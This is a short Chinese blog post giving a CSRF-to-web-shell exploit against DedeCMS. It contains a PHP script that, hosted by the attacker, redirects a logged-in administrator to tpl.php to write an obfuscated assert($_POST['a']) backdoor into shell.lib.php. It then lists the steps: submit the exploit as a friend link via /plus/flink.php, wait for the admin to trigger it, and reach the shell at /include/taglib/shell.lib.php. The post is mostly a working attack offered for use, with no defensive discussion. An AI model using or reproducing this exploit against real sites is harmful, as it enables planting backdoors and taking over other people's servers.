---
title: "dedecms 友链 getshell"
date: 2018-03-25T00:00:00+08:00
draft: false
tags: ['cms']
categories: ['web']
author: "X1r0z"

# weight: 1  # Top page

# You can also close(false) or open(true) something for this content.
# P.S. comment can only be closed
comment: false
toc: false
autoCollapseToc: false
---

csrf getshell

<!--more-->

## EXP

```
<?php
//print_r($_SERVER);
$referer = $_SERVER['HTTP_REFERER'];
$dede_login = str_replace("friendlink_main.php","",$referer);
$muma = '<'.'?'.'a'.'s'.'s'.'e'.'r'.'t'.'('.'$'.'_'.'P'.'O'.'S'.'T'.'['.'\''.'a'.'\''.']'.')'.';'.'?'.'>';
$exp = 'tpl.php?action=savetagfile&actiondo=addnewtag&content='. $muma .'&filename=shell.lib.php';
$url = $dede_login.$exp;
//echo $url;
header("location: ".$url);
// send mail coder
exit();
?>
```

将 exp 部署在服务器上

申请链接

`/plus/flink.php`

添加链接 网站填上 exp 的链接

![](http://exp10it-1252109039.cossh.myqcloud.com/2018/03/31/1522466914.jpg)

之后等待管理员触发

shell 地址

`/include/taglib/shell.lib.php`